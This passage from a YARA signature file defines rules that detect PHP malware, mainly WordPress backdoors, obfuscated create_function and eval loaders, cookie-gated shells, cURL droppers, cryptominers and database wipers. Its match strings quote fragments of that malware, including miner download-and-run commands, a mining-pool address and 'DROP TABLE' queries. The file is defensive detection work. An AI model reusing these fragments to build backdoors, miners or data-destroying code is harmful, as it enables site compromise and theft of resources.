        $trigger = "pack( \"H*\", substr("
    condition:
        $trigger and PR04589
}

private rule PR04590 : trigger
{
    strings:
        $ps0 = "$mn=str_replace('\\\\', '/', strtolower($main_file));"
    condition:
        $ps0
}

rule php_malware_component_023 : malware
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR04590
}

private rule PR04591 : trigger
{
    strings:
        $ps0 = "echo getcwd() . \"\\n\";"
    condition:
        $ps0
}

private rule PR04592 : trigger
{
    strings:
        $ps0 = "echo php_uname();"
    condition:
        $ps0
}

rule php_malware_component_024 : malware
{
    strings:
        $trigger = "echo \"<br>\";"
    condition:
        $trigger and PR04591 and PR04592
}

private rule PR04593 : trigger
{
    strings:
        $ps0 = "echo \"Bad Request\"; exit;"
    condition:
        $ps0
}

private rule PR04594 : trigger
{
    strings:
        $ps0 = "]) && (md5($_REQUEST["
    condition:
        $ps0
}

rule php_malware_component_025 : malware
{
    strings:
        $trigger = "time() + 86400 * 30 * 12 , '/' , '.' . $cookie_host);"
    condition:
        $trigger and PR01480 and PR04593 and PR04594
}

private rule PR04595 : trigger
{
    strings:
        $ps0 = "$search = Array('CURLOPT','flok','move_uploaded_file');"
    condition:
        $ps0
}

private rule PR04596 : trigger
{
    strings:
        $ps0 = "if(strpos($file->getPathname(),\"/wp-includes\") == true) continue;"
    condition:
        $ps0
}

rule php_malware_component_026 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04595 and PR04596 and PR01021
}

rule php_malware_component_027 : malware
{
    strings:
        $trigger = "$original = rotate($compressed,"
    condition:
        $trigger and PR00029
}

private rule PR04597 : trigger
{
    strings:
        $ps0 = "USPS Scam Page"
    condition:
        $ps0
}

rule php_malware_component_028 : malware
{
    strings:
        $trigger = "rray"
    condition:
        $trigger and PR04597
}

rule php_malware_component_029 : malware
{
    strings:
        $trigger = "mail($em,\"HADESHOP - Cpanel #"
    condition:
        $trigger
}

private rule PR04598 : trigger
{
    strings:
        $ps0 = "\")){@define(\"\\x"
    condition:
        $ps0
}

rule php_malware_component_030 : malware
{
    strings:
        $trigger = "<?php if(!defined(\"\\x"
    condition:
        $trigger and PR04598
}

private rule PR04599 : trigger
{
    strings:
        $ps0 = "PCFET0NUWVBFIEhUTUwgU"
    condition:
        $ps0
}

rule php_malware_component_031 : malware
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04599 and PR01877
}

private rule PR04600 : trigger
{
    strings:
        $ps0 = "$user_agent = \"ConBot\";"
    condition:
        $ps0
}

rule php_malware_ConBot_001 : malware
{
    strings:
        $trigger = "CURL"
    condition:
        $trigger and PR04600
}

private rule PR04601 : trigger
{
    strings:
        $ps0 = "] ) && crc32($_COOKIE ["
    condition:
        $ps0
}

rule php_malware_COOKIE_check_001 : malware
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01678 and PR04601
}

rule php_malware_COOKIE_check_002 : malware
{
    strings:
        $trigger = "{unlink(__FILE__); die(md5("
    condition:
        $trigger and PR00391
}

private rule PR04602 : trigger
{
    strings:
        $ps0 = "if($tmp == md5($check)){"
    condition:
        $ps0
}

rule php_malware_COOKIE_check_003 : malware
{
    strings:
        $trigger = "if(isset($_COOKIE[\""
    condition:
        $trigger and PR04602
}

rule php_malware_copy_001_02 : malware
{
    strings:
        $trigger = "copy('http://tinyurl"
    condition:
        $trigger and PR01746
}

rule php_malware_copy_002 : malware
{
    strings:
        $trigger = "if(sha1_file($formfile)!=sha1_file($tofile)){@unlink($tofile);@copy($formfile,$tofile);}"
    condition:
        $trigger
}

private rule PR04603 : trigger
{
    strings:
        $ps0 = "\"){@chmod(\""
    condition:
        $ps0
}

private rule PR04604 : trigger
{
    strings:
        $ps0 = "\") && @md5_file(\""
    condition:
        $ps0
}

private rule PR04605 : trigger
{
    strings:
        $ps0 = "\") && @file_exists(\""
    condition:
        $ps0
}

private rule PR04606 : trigger
{
    strings:
        $ps0 = "\", 0444);}"
    condition:
        $ps0
}

private rule PR04607 : trigger
{
    strings:
        $ps0 = "\", 0755);@copy("
    condition:
        $ps0
}

rule php_malware_copy_003 : malware
{
    strings:
        $trigger = "\") || @md5_file(\""
    condition:
        $trigger and PR04603 and PR04604 and PR04605 and PR04606 and PR04607
}

rule php_malware_copy_004 : malware
{
    strings:
        $trigger = "HTTP_DZMVWHBPQ"
    condition:
        $trigger and PR02521 and PR02768 and PR01021
}

private rule PR04608 : trigger
{
    strings:
        $ps0 = "print \"--> \" . $file"
    condition:
        $ps0
}

rule php_malware_copy_005 : malware
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03341 and PR04608
}

private rule PR04609 : trigger
{
    strings:
        $ps0 = "$home = $arr[\"dir\"];"
    condition:
        $ps0
}

private rule PR04610 : trigger
{
    strings:
        $ps0 = "posix_getpwuid(posix_getuid());"
    condition:
        $ps0
}

rule php_malware_copy_006 : malware
{
    strings:
        $trigger = "if(copy("
    condition:
        $trigger and PR01780 and PR04609 and PR04610
}

private rule PR04611 : trigger
{
    strings:
        $ps0 = "getFileList(\"$dir$entry/"
    condition:
        $ps0
}

private rule PR04612 : trigger
{
    strings:
        $ps0 = "if(copy("
    condition:
        $ps0
}

rule php_malware_copy_007 : malware
{
    strings:
        $trigger = "@dir($"
    condition:
        $trigger and PR01780 and PR04611 and PR04610 and PR04612
}

rule php_malware_corelibrarieshandler_001 : malware
{
    strings:
        $trigger = "foreach(str_split($session_keys, 8"
    condition:
        $trigger and PR01480
}

private rule PR04613 : trigger
{
    strings:
        $ps0 = "eval\\(\\$"
    condition:
        $ps0
}

rule php_malware_counterGAGA_001 : malware
{
    strings:
        $trigger = "=\"\";foreach($"
    condition:
        $trigger and PR04613 and PR02666
}

rule php_malware_create_function_002 : malware
{
    strings:
        $trigger = "_func=create_function('',get_option('wp_"
    condition:
        $trigger
}

private rule PR04614 : trigger
{
    strings:
        $ps0 = "function applyfilter("
    condition:
        $ps0
}

rule php_malware_create_function_003 : malware
{
    strings:
        $trigger = ");}call_user_func(create_function("
    condition:
        $trigger and PR04614
}

rule php_malware_create_function_004 : malware
{
    strings:
        $trigger = "$_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST"
    condition:
        $trigger and PR01483 and PR01422
}

private rule PR04615 : trigger
{
    strings:
        $ps0 = "@assert(get_option("
    condition:
        $ps0
}

rule php_malware_create_function_006 : malware
{
    strings:
        $trigger = "add_action('init"
    condition:
        $trigger and PR04615
}

private rule PR04616 : trigger
{
    strings:
        $ps0 = "create_function('', $"
    condition:
        $ps0
}

private rule PR04617 : trigger
{
    strings:
        $ps0 = "if (isset($_POST["
    condition:
        $ps0
}

rule php_malware_create_function_007 : malware
{
    strings:
        $trigger = "strrev"
    condition:
        $trigger and PR00732 and PR04616 and PR04617 and PR03657
}

rule php_malware_create_function_010 : malware
{
    strings:
        $trigger = ";$b374k=$func('$x','ev"
    condition:
        $trigger
}

private rule PR04618 : trigger
{
    strings:
        $ps0 = "'.''));"
    condition:
        $ps0
}

rule php_malware_create_function_011 : malware
{
    strings:
        $trigger = "create_function(chr("
    condition:
        $trigger and PR01422 and PR04618
}

rule php_malware_create_function_012 : malware
{
    strings:
        $trigger = "$errstr); array_map($"
    condition:
        $trigger and PR01483
}

rule php_malware_create_function_013 : malware
{
    strings:
        $trigger = "= create_function(null,gzuncompress(base64_decode"
    condition:
        $trigger
}

private rule PR04619 : trigger
{
    strings:
        $ps0 = "create_function(null,gzinflate(convert_uudecode("
    condition:
        $ps0
}

rule php_malware_create_function_013_02 : malware
{
    strings:
        $trigger = "if (!isset($_REQUEST["
    condition:
        $trigger and PR04619
}

// MANUAL FIX NECESSARY
private rule PR04620 : trigger
{
    strings:
        $ps0 = "=create_function('',base64_decode($"
    condition:
        $ps0
}

rule php_malware_create_function_014 : malware
{
    strings:
        $trigger = "$_POST"
        $php_malware_create_function_014_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR04620 and PR00397 and $php_malware_create_function_014_r0
}

private rule PR04621 : trigger
{
    strings:
        $ps0 = "(!empty($_REQUEST["
    condition:
        $ps0
}

rule php_malware_create_function_015 : malware
{
    strings:
        $trigger = "base64_decode($_REQUEST["
    condition:
        $trigger and PR01483 and PR04621
}

// MANUAL FIX NECESSARY
rule php_malware_create_function_016 : malware
{
    strings:
        $trigger = "call_user_func(create_function('',"
        $php_malware_create_function_016_r0 = /function [O0l1]{3,}\(\)[\s]*\{global \$[\w]+;[\s]*return[\s]*call_user_func\(\$[\w]+/
    condition:
        $trigger and $php_malware_create_function_016_r0
}

// MANUAL FIX NECESSARY
private rule PR04622 : trigger
{
    strings:
        $ps0 = "array_reverse(array("
    condition:
        $ps0
}

rule php_malware_create_function_017 : malware
{
    strings:
        $trigger = "ob_start"
        $php_malware_create_function_017_r0 = /ob_start\(\);[\s]*[\w]+\(\);[\s]*\$[\w]+[\s]*=[\s]*ob_get_clean\(\);[\s]*\$[\w]+[\s]*=[\s]*gzinflate\(\$[\w]+\);[\s]*\$[\w]+[\s]*=[\s]*implode\(..,[\s]*array_reverse\(array\([^;]+\)\)\);[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\(..,[\s]*\$[\w]+\);/
    condition:
        $trigger and PR04622 and $php_malware_create_function_017_r0
}

private rule PR04623 : trigger
{
    strings:
        $ps0 = "isset($_COOKIE[$_0])?$_COOKIE[$_0]:@$_POST[$"
    condition:
        $ps0
}

rule php_malware_create_function_018 : malware
{
    strings:
        $trigger = "&& md5($_GET["
    condition:
        $trigger and PR04623 and PR01877 and PR01479
}

// MANUAL FIX NECESSARY
rule php_malware_create_function_019 : malware
{
    strings:
        $trigger = "$_POST"
        $php_malware_create_function_019_r0 = /\$_POST\[.[\w]*.\][\s]*=[\s]*.[\w]+.;[\s]*\$[\w]+[\s]*=[\s]*Array\(\);[^_]+\]\(\$_COOKIE/
    condition:
        $trigger and PR00391 and $php_malware_create_function_019_r0
}

private rule PR04624 : trigger
{
    strings:
        $ps0 = "():'';}"
    condition:
        $ps0
}

private rule PR04625 : trigger
{
    strings:
        $ps0 = "if(!empty(${$"
    condition:
        $ps0
}

private rule PR04626 : trigger
{
    strings:
        $ps0 = "foreach(${$"
    condition:
        $ps0
}

rule php_malware_create_function_020 : malware
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR04624 and PR04625 and PR04626
}

private rule PR04627 : trigger
{
    strings:
        $ps0 = ",base64_decode(base64_decode($"
    condition:
        $ps0
}

rule php_malware_create_function_021 : malware
{
    strings:
        $trigger = "__DIR__ ."
    condition:
        $trigger and PR00435 and PR04627
}

private rule PR04628 : trigger
{
    strings:
        $ps0 = "return @($"
    condition:
        $ps0
}

rule php_malware_create_function_022 : malware
{
    strings:
        $trigger = "extract(array("
    condition:
        $trigger and PR01483 and PR04628
}

private rule PR04629 : trigger
{
    strings:
        $ps0 = "]}).substr(MD5(strrev(${${\"\\x"
    condition:
        $ps0
}

rule php_malware_create_function_023 : malware
{
    strings:
        $trigger = "]}=@gzinflate(${${"
    condition:
        $trigger and PR00732 and PR04629
}

private rule PR04630 : trigger
{
    strings:
        $ps0 = "gzuncompress(strrev($"
    condition:
        $ps0
}

rule php_malware_create_function_024 : malware
{
    strings:
        $trigger = "stream_get_contents($"
    condition:
        $trigger and PR01483 and PR04630
}

private rule PR04631 : trigger
{
    strings:
        $ps0 = "array(chr(125),chr(47).chr(42));"
    condition:
        $ps0
}

rule php_malware_create_function_025 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04631 and PR00091 and PR00341
}

// MANUAL FIX NECESSARY
private rule PR04632 : trigger
{
    strings:
        $ps0 = "\".\"\\1"
    condition:
        $ps0
}

private rule PR04633 : trigger
{
    strings:
        $ps0 = "('',\"\\"
    condition:
        $ps0
}

rule php_malware_create_function_026 : malware
{
    strings:
        $trigger = "\".\"\\x"
        $php_malware_create_function_026_r0 = /(\$[\w]+[^;]+\.[\s]*\\".[^;]+;[\s]*)+\$[\w]+\(\);[\s]*/
    condition:
        $trigger and PR01613 and PR00719 and PR04632 and PR04633 and $php_malware_create_function_026_r0
}

rule php_malware_create_function_027 : malware
{
    strings:
        $trigger = ",@$_POST['O'.(1-1)"
    condition:
        $trigger
}

private rule PR04634 : trigger
{
    strings:
        $ps0 = "create_function('', '}'.$"
    condition:
        $ps0
}

rule php_malware_create_function_028 : malware
{
    strings:
        $trigger = "\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65"
    condition:
        $trigger and PR04634
}

private rule PR04635 : trigger
{
    strings:
        $ps0 = "gzuncompress(strrev(substr($"
    condition:
        $ps0
}

private rule PR04636 : trigger
{
    strings:
        $ps0 = "create_function("
    condition:
        $ps0
}

rule php_malware_create_function_029 : malware
{
    strings:
        $trigger = "fseek($"
    condition:
        $trigger and PR04635 and PR04636
}

private rule PR04637 : trigger
{
    strings:
        $ps0 = "create_function(str_rot13('$').base64_decode("
    condition:
        $ps0
}

private rule PR04638 : trigger
{
    strings:
        $ps0 = ").str_rot13(')').chr(0x"
    condition:
        $ps0
}

rule php_malware_create_function_030 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR04637 and PR04638
}

private rule PR04639 : trigger
{
    strings:
        $ps0 = "if(isset("
    condition:
        $ps0
}

rule php_malware_create_function_031 : malware
{
    strings:
        $trigger = "=create_function(null,$_"
    condition:
        $trigger and PR04639
}

private rule PR04640 : trigger
{
    strings:
        $ps0 = "dNe7tqY5J/DyTOM+sxyf9+RDmal58"
    condition:
        $ps0
}

rule php_malware_cryptominer_001 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04640
}

// MANUAL FIX NECESSARY
rule php_malware_cryptominer_002_02 : malware
{
    strings:
        $trigger = ")));');"
        $php_malware_cryptominer_002_02_r0 = /\$\w+\s*=\s*['\"\.create_function\\x63\\x72e\\x61\\x74e\\x5F\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E]+\s*;\s*\$(\w+)\s*=\s*\@\$\w+\(['\"]\$\w+['\"]\s*,\s*['\"\.\(\?\>eval gzinflate base64_decode\\x67\\x7A\\x6E\\x66\\x6C\\x61\\x74e\\x62\\x61\\x73e\\x5F\\x64e\\x63\\x6F\\x64]+\(\$/
    condition:
        $trigger and $php_malware_cryptominer_002_02_r0
}

private rule PR04641 : trigger
{
    strings:
        $ps0 = "cryptonight -o monerohash.com:"
    condition:
        $ps0
}

rule php_malware_cryptominer_003 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04641 and PR00013
}

rule php_malware_cryptominer_005 : malware
{
    strings:
        $trigger = "exec(\"sed -n '/SORRYIMPOOR/,/IHAVENOJOB/p"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_cryptominer_005_02 : malware
{
    strings:
        $trigger = "*/"
        $php_malware_cryptominer_005_02_r0 = /\*\*[\s]*SORRYIMPOOR/
    condition:
        $trigger and $php_malware_cryptominer_005_02_r0
}

private rule PR04642 : trigger
{
    strings:
        $ps0 = "assets/js/jquory.js"
    condition:
        $ps0
}

rule php_malware_cryptominer_006 : malware
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR04642
}

private rule PR04643 : trigger
{
    strings:
        $ps0 = "system(base64_decode(\"Li9jbnJpZyAtYSBjcnlwdG9uaW"
    condition:
        $ps0
}

rule php_malware_cryptominer_007 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04643
}

rule php_malware_cryptominer_008 : malware
{
    strings:
        $trigger = "echo '<div class=\"minero-hidden\" style=\"display"
    condition:
        $trigger
}

private rule PR04644 : trigger
{
    strings:
        $ps0 = "<script src=\"https://minero.cc/lib/minero-hidden"
    condition:
        $ps0
}

private rule PR04645 : trigger
{
    strings:
        $ps0 = "style"
    condition:
        $ps0
}

private rule PR04646 : trigger
{
    strings:
        $ps0 = "div class=\"minero-hidden\""
    condition:
        $ps0
}

rule php_malware_cryptominer_008_02 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04644 and PR04645 and PR04646
}

private rule PR04647 : trigger
{
    strings:
        $ps0 = "$_SERVER[\"REQUEST_URI\"] = str_replace(\"?reboot=yes\", \"\", $_SERVER["
    condition:
        $ps0
}

rule php_malware_cryptominer_009 : malware
{
    strings:
        $trigger = "system("
    condition:
        $trigger and PR04647
}

private rule PR04648 : trigger
{
    strings:
        $ps0 = "return url_get_contents(\"$URL_GET?filename=$filename&host=$host\");"
    condition:
        $ps0
}

rule php_malware_cryptominer_010 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01401 and PR04648
}

// MANUAL FIX NECESSARY
private rule PR04649 : trigger
{
    strings:
        $ps0 = "(str_shuffle(MD5($"
    condition:
        $ps0
}

rule php_malware_cryptominer_011 : malware
{
    strings:
        $trigger = "base64_decode(chr("
        $php_malware_cryptominer_011_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR04649 and $php_malware_cryptominer_011_r0
}

// MANUAL FIX NECESSARY
rule php_malware_cryptominer_012 : malware
{
    strings:
        $trigger = "system("
        $php_malware_cryptominer_012_r0 = /<\?php[\s]*system\(.[^\)]+([\w]+.x[\d]+[\s]*)+[^;]+\);/
    condition:
        $trigger and $php_malware_cryptominer_012_r0
}

private rule PR04650 : trigger
{
    strings:
        $ps0 = "cpuminer-sse2"
    condition:
        $ps0
}

rule php_malware_cryptominer_013 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04650 and PR01445
}

rule php_malware_cryptominer_014 : malware
{
    strings:
        $trigger = "ZWNobyAnc2lsaXQgaXMgbWJ1a2knOwpAaW5"
    condition:
        $trigger and PR01398
}

rule php_malware_cryptominer_015 : malware
{
    strings:
        $trigger = "/host.tar.gz && tar zxf host.tar.gz && chmod +x cpuminer-"
    condition:
        $trigger and PR02001
}

private rule PR04651 : trigger
{
    strings:
        $ps0 = "$data = @unserialize(cs_decrypt(base64_decode($data), $data_key));"
    condition:
        $ps0
}

rule php_malware_cs_auth_001 : malware
{
    strings:
        $trigger = "cs_auth"
    condition:
        $trigger and PR01854 and PR00029 and PR04651
}

rule php_malware_curl_025 : malware
{
    strings:
        $trigger = "$compressed=base64_decode($cookieData);"
    condition:
        $trigger
}

private rule PR04652 : trigger
{
    strings:
        $ps0 = "echo \"Sukses\""
    condition:
        $ps0
}

private rule PR04653 : trigger
{
    strings:
        $ps0 = "array(\"username\" => $username, \"password\" => $password)"
    condition:
        $ps0
}

rule php_malware_curl_026 : malware
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR04652 and PR04653
}

private rule PR04654 : trigger
{
    strings:
        $ps0 = "preg_match_all(\"/(<title[^>]*>)(.*?)(<\\/title>)"
    condition:
        $ps0
}

rule php_malware_curl_027 : malware
{
    strings:
        $trigger = "shell_test"
    condition:
        $trigger and PR00070 and PR04654 and PR02163
}

private rule PR04655 : trigger
{
    strings:
        $ps0 = "(@strpos(@strtolower($this->cookie)"
    condition:
        $ps0
}

private rule PR04656 : trigger
{
    strings:
        $ps0 = "])){setcookie("
    condition:
        $ps0
}

rule php_malware_curl_028 : malware
{
    strings:
        $trigger = "ucwords(strtolower(str_replace("
    condition:
        $trigger and PR00391 and PR04655 and PR04656
}

private rule PR04657 : trigger
{
    strings:
        $ps0 = "=str_ireplace("
    condition:
        $ps0
}

rule php_malware_curl_030 : malware
{
    strings:
        $trigger = "));}set_error_handler("
    condition:
        $trigger and PR01483 and PR04657
}

private rule PR04658 : trigger
{
    strings:
        $ps0 = "function bot($res)"
    condition:
        $ps0
}

rule php_malware_curl_031 : malware
{
    strings:
        $trigger = "str_replace("
    condition:
        $trigger and PR01553 and PR02092 and PR02231 and PR01543 and PR04658
}

private rule PR04659 : trigger
{
    strings:
        $ps0 = "DVa1EuwIDPuce29ShGmu2jAzbnMTZuZ8/W3nzrY"
    condition:
        $ps0
}

rule php_malware_curl_033 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04659
}

private rule PR04660 : trigger
{
    strings:
        $ps0 = "(base64_decode(base64_decode(base64_decode("
    condition:
        $ps0
}

rule php_malware_curl_034 : malware
{
    strings:
        $trigger = "remote_traffic_uri\" => $remote_traffic_uri,"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR04660
}

private rule PR04661 : trigger
{
    strings:
        $ps0 = "curl_init(base64_decode(\"aHR0"
    condition:
        $ps0
}

rule php_malware_curl_035 : malware
{
    strings:
        $trigger = "if(isset($_POST["
    condition:
        $trigger and PR01553 and PR01401 and PR04661
}

private rule PR04662 : trigger
{
    strings:
        $ps0 = "curl_init(base64_decode(strrev(\"AHa"
    condition:
        $ps0
}

rule php_malware_curl_035_02 : malware
{
    strings:
        $trigger = "if(isset($_POST["
    condition:
        $trigger and PR01553 and PR01401 and PR04662
}

private rule PR04663 : trigger
{
    strings:
        $ps0 = "curl_init(base64_decode($"
    condition:
        $ps0
}

rule php_malware_curl_035_03 : malware
{
    strings:
        $trigger = "if(isset($_POST["
    condition:
        $trigger and PR01553 and PR01401 and PR04663
}

private rule PR04664 : trigger
{
    strings:
        $ps0 = "curl_init(base64_decode(\"9hb"
    condition:
        $ps0
}

rule php_malware_curl_035_04 : malware
{
    strings:
        $trigger = "if(isset($_POST["
    condition:
        $trigger and PR01553 and PR01401 and PR04664
}

private rule PR04665 : trigger
{
    strings:
        $ps0 = "$headers = array(\"Accept: \".$"
    condition:
        $ps0
}

rule php_malware_curl_036 : malware
{
    strings:
        $trigger = "return curl_exec($"
    condition:
        $trigger and PR00042 and PR04665 and PR00046
}

private rule PR04666 : trigger
{
    strings:
        $ps0 = "array(\"X-FORWARDED-FOR"
    condition:
        $ps0
}

rule php_malware_curl_037 : malware
{
    strings:
        $trigger = "rand(0,255)."
    condition:
        $trigger and PR01553 and PR01401 and PR04666
}

rule php_malware_curl_039 : malware
{
    strings:
        $trigger = "=http_get(\"http"
    condition:
        $trigger and PR01553 and PR01401
}

private rule PR04667 : trigger
{
    strings:
        $ps0 = "curl_init(base64_decode("
    condition:
        $ps0
}

rule php_malware_curl_040 : malware
{
    strings:
        $trigger = ");eval('?>'.$"
    condition:
        $trigger and PR01553 and PR01401 and PR04667
}

private rule PR04668 : trigger
{
    strings:
        $ps0 = "if(adminer("
    condition:
        $ps0
}

rule php_malware_curl_041 : malware
{
    strings:
        $trigger = "fopen($"
    condition:
        $trigger and PR04668 and PR01553 and PR01401
}

rule php_malware_curl_042 : malware
{
    strings:
        $trigger = "$!start!$"
    condition:
        $trigger and PR02448 and PR01490
}

private rule PR04669 : trigger
{
    strings:
        $ps0 = "+=array_flip(str_split(strtoupper($"
    condition:
        $ps0
}

rule php_malware_curl_043 : malware
{
    strings:
        $trigger = "(hex2bin(hash(base64_decode("
    condition:
        $trigger and PR04669 and PR01553 and PR01401
}

rule php_malware_curl_044 : malware
{
    strings:
        $trigger = "return urldecode(base64_decode(implode($"
    condition:
        $trigger and PR00091 and PR00341 and PR00342
}

private rule PR04670 : trigger
{
    strings:
        $ps0 = "botbotbot"
    condition:
        $ps0
}

rule php_malware_curl_045 : malware
{
    strings:
        $trigger = ").mb_strtolower($_SERVER[HTTP_USER_AGENT]);$"
    condition:
        $trigger and PR04670 and PR00341 and PR00342
}

rule php_malware_curl_045_02 : malware
{
    strings:
        $trigger = "error_reporting(0);"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR04670
}

rule php_malware_curl_045_03 : malware
{
    strings:
        $trigger = "$botbot"
    condition:
        $trigger and PR00091 and PR00341 and PR00342 and PR04670
}

private rule PR04671 : trigger
{
    strings:
        $ps0 = "mb_strtolower($_SERVER[HTTP_USER_AGENT]); goto"
    condition:
        $ps0
}

rule php_malware_curl_045_04 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04670 and PR00341 and PR04671
}

private rule PR04672 : trigger
{
    strings:
        $ps0 = "(strpos($botbotbot,\"google\")"
    condition:
        $ps0
}

private rule PR04673 : trigger
{
    strings:
        $ps0 = "mb_strtolower($_SERVER["
    condition:
        $ps0
}

rule php_malware_curl_045_05 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04672 and PR00341 and PR04673
}

rule php_malware_curl_045_06 : malware
{
    strings:
        $trigger = "$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? \"...\" . strtolower($_SERVER['HTTP_USER_AGENT']) : '';"
    condition:
        $trigger and PR00341 and PR00342 and PR04670
}

private rule PR04674 : trigger
{
    strings:
        $ps0 = "if ($code_rand == 1)"
    condition:
        $ps0
}

rule php_malware_curl_045_08 : malware
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR04149 and PR04670 and PR04674
}

private rule PR04675 : trigger
{
    strings:
        $ps0 = ".base64_decode(\"JmRvbWFpbj0=\").$_SERVER[base64_decode(\"SFRUUF9IT1NU\")];"
    condition:
        $ps0
}

rule php_malware_curl_045_09 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04675 and PR00341
}

private rule PR04676 : trigger
{
    strings:
        $ps0 = "$xxx3"
    condition:
        $ps0
}

private rule PR04677 : trigger
{
    strings:
        $ps0 = "echo $result; } goto"
    condition:
        $ps0
}

rule php_malware_curl_045_11 : malware
{
    strings:
        $trigger = "base64_decode(\"\\"
    condition:
        $trigger and PR04676 and PR04677
}

private rule PR04678 : trigger
{
    strings:
        $ps0 = "aHJlZj0="
    condition:
        $ps0
}

rule php_malware_curl_045_12 : malware
{
    strings:
        $trigger = "botbotbot"
    condition:
        $trigger and PR04678 and PR00091 and PR00341 and PR00342
}

rule php_malware_curl_045_13 : malware
{
    strings:
        $trigger = "@unlink("
    condition:
        $trigger and PR00435 and PR01403 and PR04670
}

private rule PR04679 : trigger
{
    strings:
        $ps0 = "]);}}header(\"location:"
    condition:
        $ps0
}

rule php_malware_curl_046 : malware
{
    strings:
        $trigger = "])){setcookie("
    condition:
        $trigger and PR00391 and PR04679
}

private rule PR04680 : trigger
{
    strings:
        $ps0 = "FVZFrsUIkjxOV8kLM2nUC7P9zAybkZmZffr5c4HIV"
    condition:
        $ps0
}

rule php_malware_curl_047 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04680
}

rule php_malware_curl_048 : malware
{
    strings:
        $trigger = "CURLOPT_COOKIE,preg_replace('/PHPSESSID="
    condition:
        $trigger and PR00091 and PR00341 and PR00342
}

private rule PR04681 : trigger
{
    strings:
        $ps0 = "];continue;}if (false"
    condition:
        $ps0
}

private rule PR04682 : trigger
{
    strings:
        $ps0 = ")}()) exit;}}};}$"
    condition:
        $ps0
}

rule php_malware_curl_049 : malware
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01654 and PR04681 and PR04682 and PR02563
}

private rule PR04683 : trigger
{
    strings:
        $ps0 = "$result = curl_exec($ch); curl_close($ch); echo $result; } goto"
    condition:
        $ps0
}

private rule PR04684 : trigger
{
    strings:
        $ps0 = "<?php goto"
    condition:
        $ps0
}

rule php_malware_curl_050 : malware
{
    strings:
        $trigger = "mb_stripos"
    condition:
        $trigger and PR01401 and PR04683 and PR04684
}

private rule PR04685 : trigger
{
    strings:
        $ps0 = "curl_exec($exe);"
    condition:
        $ps0
}

rule php_malware_curl_051 : malware
{
    strings:
        $trigger = "curl_setopt"
    condition:
        $trigger and PR01401 and PR04685
}

private rule PR04686 : trigger
{
    strings:
        $ps0 = "@fclose(@fwrite(@fopen("
    condition:
        $ps0
}

rule php_malware_curl_053 : malware
{
    strings:
        $trigger = "CURLOPT_URL"
    condition:
        $trigger and PR04686 and PR00091 and PR00341
}

private rule PR04687 : trigger
{
    strings:
        $ps0 = "\"Can't Create DataFN\""
    condition:
        $ps0
}

rule php_malware_datafn_001 : malware
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04687
}

private rule PR04688 : trigger
{
    strings:
        $ps0 = "unlink(ABSPATH.\""
    condition:
        $ps0
}

rule php_malware_db_drop_001 : malware
{
    strings:
        $trigger = "$wpdb->query(\"DROP TABLE \".$wpdb->prefix.\"users\");"
    condition:
        $trigger and PR02534 and PR04688
}

private rule PR04689 : trigger
{
    strings:
        $ps0 = "require( dirname(__FILE__) . '/wp-load.php' );"
    condition:
        $ps0
}

rule php_malware_db_drop_002 : malware
{
    strings:
        $trigger = "$wpdb->query('TRUNCATE TABLE"
    condition:
        $trigger and PR04689
}

private rule PR04690 : trigger
{
    strings:
        $ps0 = "chmod(\"/"
    condition:
        $ps0
}

rule php_malware_db_injector_001 : malware
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"].\"/wp-config.php\";"
    condition:
        $trigger and PR00435 and PR03374 and PR04690
}

private rule PR04691 : trigger
{
    strings:
        $ps0 = "$_POST[\"backname\"].\".php&&&\".$directory.\"/\".$_POST[\"backname"
    condition:
        $ps0
}

rule php_malware_db_injector_001_02 : malware
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"].\"/wp-config.php\";"
    condition:
        $trigger and PR00435 and PR04691 and PR03374
}

private rule PR04692 : trigger
{
    strings:
        $ps0 = "html = \"<!--$unicid-->\".trim($slova[array_rand($slova, 1)]).\"<!--/$unicid-->\";"
    condition:
        $ps0
}

rule php_malware_db_injector_002 : malware
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR04692
}

private rule PR04693 : trigger
{
    strings:
        $ps0 = "resu_etaerc_pw'), array($"
    condition:
        $ps0
}

private rule PR04694 : trigger
{
    strings:
        $ps0 = "(call_user_func($wp_"
    condition:
        $ps0
}

rule php_malware_db_injector_003 : malware
{
    strings:
